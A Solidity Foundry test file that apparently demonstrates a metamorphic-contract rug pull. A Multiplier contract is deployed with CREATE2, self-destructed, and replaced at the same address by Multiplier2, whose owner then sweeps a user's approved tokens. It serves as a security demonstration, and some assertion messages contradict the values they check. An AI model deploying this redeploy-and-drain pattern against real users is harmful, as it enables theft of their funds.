// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {Factory} from "../../src/metamorphic/Factory.sol";
import {Multiplier} from "../../src/metamorphic/Multiplier.sol";
import {Multiplier2} from "../../src/metamorphic/Multiplier2.sol";
import {Destroy} from "../../src/metamorphic/Destroy.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract MultiplerRug is Test {
    ERC20 public rewardToken;
    Multiplier public multiplier;
    Factory public factoryContract;
    address public multiplierAddr;
    uint256 give = 1 ether;
    address user = address(1234);

    function setUp() public {
        // Create factory contract and prepare multisig bytecode for deployment
		factoryContract = new Factory();
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multiplier.sol"));

		// deploy contract bytecode using create2
        multiplierAddr = factoryContract.deploy(1, bytecode);
        multiplier = Multiplier(multiplierAddr);
        rewardToken = new ERC20("Wrapped Ether", "rewardToken");
        multiplier.init(address(rewardToken), 2);

        uint256 multiplied = give * multiplier.multiplier();
        deal(multiplier.rewardToken(), user, give);
        
        // Never make assertions in the setUp function. Failed assertions won't result with failed test.
        // But if the test fails, failed assert will be visible
        // https://book.getfoundry.sh/tutorials/best-practices?highlight=setup#general-test-guidance
        assertEq(rewardToken.balanceOf(user), give);

        deal(multiplier.rewardToken(), multiplierAddr, multiplied);
        vm.prank(user);
        rewardToken.approve(multiplierAddr, multiplied + 1);
        vm.prank(user);
        Multiplier(multiplierAddr).multiply(give);

        assertEq(rewardToken.balanceOf(user), multiplied);
        assertEq(rewardToken.balanceOf(multiplierAddr), give);

        // The selfdestruct call must be done in setUp() due to a foundry limitation: https://github.com/foundry-rs/foundry/issues/1543
        address destroyAddr = address(new Destroy());
        Multiplier(multiplierAddr).sweep(destroyAddr); // Calls selfdestruct on the multisig
    }

    function testMetamorphicRug() public {
        // deploy new multisig with different contract which will drain all the funds from treasury
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multiplier2.sol"));
        address newMultiplierAddr = factoryContract.deploy(1, bytecode);

        // confirm that the new multisig has the same address as the old one
        assertEq(newMultiplierAddr, multiplierAddr);
        address owner = address(0x999);
        vm.prank(owner);
        Multiplier2(newMultiplierAddr).init(address(rewardToken), 2);

        // confirm that the new multisig has the no balance
        assertEq(rewardToken.balanceOf(address(newMultiplierAddr)), give, "newMultiplierAddr balance should be 0");
        // confirm that the user has multiplied balance
        assertEq(rewardToken.balanceOf(address(user)), give * multiplier.multiplier(), "user balance should be multiplied");

        // drain the funds from user wallet
        vm.prank(owner);
        Multiplier2(newMultiplierAddr).sweep(address(user));
        // confirm that the user has the no balance
        assertEq(rewardToken.balanceOf(address(user)), give - 1, "!user balance");
        // confirm the contract sweep user balance
        assertEq(rewardToken.balanceOf(address(owner)), give + 1, "owner balance should be multiplied");
    }

    function testTheSameContract() public {
        // deploy the same contract with the same salt will produce the same address
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multiplier.sol"));
        address newMultisigAddr = factoryContract.deploy(1, bytecode);
        assertEq(newMultisigAddr, multiplierAddr);
    }

    function testDifferentContract() public {
        // deploy the different contract with the same salt will produce the same address
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multiplier2.sol"));
        address newMultisigAddr = factoryContract.deploy(1, bytecode);
        assertEq(newMultisigAddr, multiplierAddr);
    }

    function testDifferentSalt() public {
        // deploy the same contract but with a different salt will produce a different address
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multiplier.sol"));
        address newMultisigAddr = factoryContract.deploy(2, bytecode);

        // different salt will produce different address
        assertTrue(multiplierAddr != newMultisigAddr);
    }
}
